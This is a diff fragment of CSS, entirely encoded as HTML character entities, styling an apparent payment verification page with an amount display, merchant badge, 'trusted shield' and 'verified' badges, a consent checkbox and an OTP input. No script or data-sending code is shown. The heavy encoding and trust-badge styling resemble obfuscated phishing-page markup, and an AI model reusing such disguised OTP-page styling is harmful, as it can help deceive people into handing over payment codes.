+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#105;&#110;&#116;&#101;&#114;&#45;&#101;&#118;&#101;&#110;&#116;&#115;&#58;&#32;&#110;&#111;&#110;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#97;&#109;&#111;&#117;&#110;&#116;&#45;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#49;&#56;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#119;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#52;&#48;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#49;&#97;&#49;&#97;&#49;&#97;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#101;&#120;&#116;&#45;&#97;&#108;&#105;&#103;&#110;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#98;&#111;&#116;&#116;&#111;&#109;&#58;&#32;&#50;&#48;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#49;&#50;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#35;&#102;&#51;&#102;&#52;&#102;&#54;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#56;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#102;&#97;&#109;&#105;&#108;&#121;&#58;&#32;&#45;&#97;&#112;&#112;&#108;&#101;&#45;&#115;&#121;&#115;&#116;&#101;&#109;&#44;&#32;&#66;&#108;&#105;&#110;&#107;&#77;&#97;&#99;&#83;&#121;&#115;&#116;&#101;&#109;&#70;&#111;&#110;&#116;&#44;&#32;&#115;&#97;&#110;&#115;&#45;&#115;&#101;&#114;&#105;&#102;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#108;&#101;&#116;&#116;&#101;&#114;&#45;&#115;&#112;&#97;&#99;&#105;&#110;&#103;&#58;&#32;&#45;&#48;&#46;&#50;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#112;&#97;&#103;&#101;&#45;&#99;&#111;&#110;&#116;&#97;&#105;&#110;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#105;&#110;&#45;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#48;&#48;&#118;&#104;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#108;&#101;&#120;&#45;&#100;&#105;&#114;&#101;&#99;&#116;&#105;&#111;&#110;&#58;&#32;&#99;&#111;&#108;&#117;&#109;&#110;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#45;&#116;&#111;&#112;&#58;&#32;&#49;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#45;&#119;&#114;&#97;&#112;&#112;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#108;&#101;&#120;&#58;&#32;&#49;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#98;&#111;&#116;&#116;&#111;&#109;&#58;&#32;&#54;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#98;&#97;&#100;&#103;&#101;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#117;&#114;&#115;&#111;&#114;&#58;&#32;&#112;&#111;&#105;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#108;&#101;&#102;&#116;&#58;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#100;&#114;&#111;&#112;&#100;&#111;&#119;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#112;&#58;&#32;&#49;&#48;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#108;&#101;&#102;&#116;&#58;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#119;&#104;&#105;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#120;&#45;&#115;&#104;&#97;&#100;&#111;&#119;&#58;&#32;&#48;&#32;&#52;&#112;&#120;&#32;&#54;&#112;&#120;&#32;&#114;&#103;&#98;&#97;&#40;&#48;&#44;&#48;&#44;&#48;&#44;&#48;&#46;&#49;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#122;&#45;&#105;&#110;&#100;&#101;&#120;&#58;&#32;&#49;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#51;&#48;&#48;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#98;&#97;&#100;&#103;&#101;&#58;&#104;&#111;&#118;&#101;&#114;&#32;&#46;&#109;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#45;&#100;&#114;&#111;&#112;&#100;&#111;&#119;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#98;&#108;&#111;&#99;&#107;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#116;&#114;&#117;&#115;&#116;&#101;&#100;&#45;&#115;&#104;&#105;&#101;&#108;&#100;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#103;&#97;&#112;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#35;&#54;&#54;&#66;&#66;&#54;&#65;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#98;&#111;&#116;&#116;&#111;&#109;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#118;&#101;&#114;&#105;&#102;&#105;&#101;&#100;&#45;&#116;&#97;&#103;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#48;&#46;&#55;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#114;&#103;&#98;&#97;&#40;&#50;&#53;&#53;&#44;&#50;&#53;&#53;&#44;&#50;&#53;&#53;&#44;&#48;&#46;&#50;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#48;&#46;&#50;&#53;&#114;&#101;&#109;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#69;&#48;&#69;&#48;&#69;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#105;&#116;&#101;&#109;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#103;&#97;&#112;&#58;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#48;&#46;&#56;&#55;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#52;&#66;&#53;&#53;&#54;&#51;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#48;&#46;&#50;&#53;&#114;&#101;&#109;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#45;&#116;&#105;&#99;&#107;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#108;&#101;&#120;&#45;&#115;&#104;&#114;&#105;&#110;&#107;&#58;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#49;&#48;&#66;&#57;&#56;&#49;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#98;&#111;&#116;&#116;&#111;&#109;&#45;&#108;&#111;&#103;&#111;&#115;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#50;&#114;&#101;&#109;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#97;&#114;&#103;&#105;&#110;&#45;&#116;&#111;&#112;&#58;&#32;&#97;&#117;&#116;&#111;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#112;&#97;&#114;&#101;&#110;&#116;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#64;&#107;&#101;&#121;&#102;&#114;&#97;&#109;&#101;&#115;&#32;&#115;&#104;&#105;&#101;&#108;&#100;&#80;&#117;&#108;&#115;&#101;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#48;&#37;&#32;&#123;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#115;&#99;&#97;&#108;&#101;&#40;&#49;&#41;&#32;&#114;&#111;&#116;&#97;&#116;&#101;&#40;&#48;&#100;&#101;&#103;&#41;&#59;&#32;&#102;&#105;&#108;&#116;&#101;&#114;&#58;&#32;&#98;&#114;&#105;&#103;&#104;&#116;&#110;&#101;&#115;&#115;&#40;&#49;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#53;&#48;&#37;&#32;&#123;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#115;&#99;&#97;&#108;&#101;&#40;&#49;&#46;&#48;&#53;&#41;&#32;&#114;&#111;&#116;&#97;&#116;&#101;&#40;&#53;&#100;&#101;&#103;&#41;&#59;&#32;&#102;&#105;&#108;&#116;&#101;&#114;&#58;&#32;&#98;&#114;&#105;&#103;&#104;&#116;&#110;&#101;&#115;&#115;&#40;&#49;&#46;&#50;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#49;&#48;&#48;&#37;&#32;&#123;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#115;&#99;&#97;&#108;&#101;&#40;&#49;&#41;&#32;&#114;&#111;&#116;&#97;&#116;&#101;&#40;&#48;&#100;&#101;&#103;&#41;&#59;&#32;&#102;&#105;&#108;&#116;&#101;&#114;&#58;&#32;&#98;&#114;&#105;&#103;&#104;&#116;&#110;&#101;&#115;&#115;&#40;&#49;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#115;&#104;&#105;&#101;&#108;&#100;&#45;&#105;&#99;&#111;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#110;&#105;&#109;&#97;&#116;&#105;&#111;&#110;&#58;&#32;&#115;&#104;&#105;&#101;&#108;&#100;&#80;&#117;&#108;&#115;&#101;&#32;&#50;&#115;&#32;&#105;&#110;&#102;&#105;&#110;&#105;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#45;&#115;&#116;&#121;&#108;&#101;&#58;&#32;&#112;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#45;&#51;&#100;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#101;&#114;&#115;&#112;&#101;&#99;&#116;&#105;&#118;&#101;&#58;&#32;&#49;&#48;&#48;&#48;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#102;&#108;&#101;&#120;&#45;&#115;&#116;&#97;&#114;&#116;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#103;&#97;&#112;&#58;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#48;&#46;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#48;&#46;&#50;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#117;&#114;&#115;&#111;&#114;&#58;&#32;&#112;&#111;&#105;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#48;&#46;&#56;&#55;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#52;&#66;&#53;&#53;&#54;&#51;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#99;&#104;&#101;&#99;&#107;&#98;&#111;&#120;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#49;&#46;&#50;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#46;&#50;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#58;&#32;&#50;&#112;&#120;&#32;&#115;&#111;&#108;&#105;&#100;&#32;&#35;&#68;&#49;&#68;&#53;&#68;&#66;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#32;&#48;&#46;&#50;&#53;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#45;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#108;&#101;&#120;&#45;&#115;&#104;&#114;&#105;&#110;&#107;&#58;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#99;&#104;&#101;&#99;&#107;&#98;&#111;&#120;&#46;&#99;&#104;&#101;&#99;&#107;&#101;&#100;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#49;&#48;&#66;&#57;&#56;&#49;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#49;&#48;&#66;&#57;&#56;&#49;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#99;&#104;&#101;&#99;&#107;&#98;&#111;&#120;&#32;&#115;&#118;&#103;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#100;&#116;&#104;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#119;&#104;&#105;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#99;&#111;&#110;&#115;&#101;&#110;&#116;&#45;&#99;&#104;&#101;&#99;&#107;&#98;&#111;&#120;&#46;&#99;&#104;&#101;&#99;&#107;&#101;&#100;&#32;&#115;&#118;&#103;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#98;&#108;&#111;&#99;&#107;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#45;&#115;&#108;&#105;&#100;&#101;&#45;&#105;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#110;&#105;&#109;&#97;&#116;&#105;&#111;&#110;&#58;&#32;&#115;&#108;&#105;&#100;&#101;&#73;&#110;&#32;&#48;&#46;&#51;&#115;&#32;&#101;&#97;&#115;&#101;&#45;&#111;&#117;&#116;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#64;&#107;&#101;&#121;&#102;&#114;&#97;&#109;&#101;&#115;&#32;&#115;&#108;&#105;&#100;&#101;&#73;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#114;&#111;&#109;&#32;&#123;&#32;&#111;&#112;&#97;&#99;&#105;&#116;&#121;&#58;&#32;&#48;&#59;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#89;&#40;&#49;&#48;&#112;&#120;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#32;&#123;&#32;&#111;&#112;&#97;&#99;&#105;&#116;&#121;&#58;&#32;&#49;&#59;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#89;&#40;&#48;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#45;&#115;&#112;&#105;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#105;&#110;&#108;&#105;&#110;&#101;&#45;&#98;&#108;&#111;&#99;&#107;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#110;&#105;&#109;&#97;&#116;&#105;&#111;&#110;&#58;&#32;&#115;&#112;&#105;&#110;&#32;&#49;&#115;&#32;&#108;&#105;&#110;&#101;&#97;&#114;&#32;&#105;&#110;&#102;&#105;&#110;&#105;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#45;&#119;&#101;&#98;&#107;&#105;&#116;&#45;&#97;&#110;&#105;&#109;&#97;&#116;&#105;&#111;&#110;&#58;&#32;&#115;&#112;&#105;&#110;&#32;&#49;&#115;&#32;&#108;&#105;&#110;&#101;&#97;&#114;&#32;&#105;&#110;&#102;&#105;&#110;&#105;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#64;&#107;&#101;&#121;&#102;&#114;&#97;&#109;&#101;&#115;&#32;&#115;&#112;&#105;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#114;&#111;&#109;&#32;&#123;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#114;&#111;&#116;&#97;&#116;&#101;&#40;&#48;&#100;&#101;&#103;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#32;&#123;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#114;&#111;&#116;&#97;&#116;&#101;&#40;&#51;&#54;&#48;&#100;&#101;&#103;&#41;&#59;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#58;&#58;&#112;&#108;&#97;&#99;&#101;&#104;&#111;&#108;&#100;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#57;&#67;&#65;&#51;&#65;&#70;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#112;&#97;&#99;&#105;&#116;&#121;&#58;&#32;&#48;&#46;&#55;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#58;&#102;&#111;&#99;&#117;&#115;&#58;&#58;&#112;&#108;&#97;&#99;&#101;&#104;&#111;&#108;&#100;&#101;&#114;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#112;&#97;&#99;&#105;&#116;&#121;&#58;&#32;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#111;&#116;&#112;&#45;&#105;&#110;&#112;&#117;&#116;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#97;&#114;&#101;&#116;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#112;&#97;&#114;&#101;&#110;&#116;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#98;&#116;&#110;&#45;&#108;&#111;&#97;&#100;&#105;&#110;&#103;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#46;&#98;&#116;&#110;&#45;&#108;&#111;&#97;&#100;&#105;&#110;&#103;&#32;&#115;&#112;&#97;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#111;&#112;&#97;&#99;&#105;&#116;&#121;&#58;&#32;&#48;&#46;&#53;&#59;&#13;
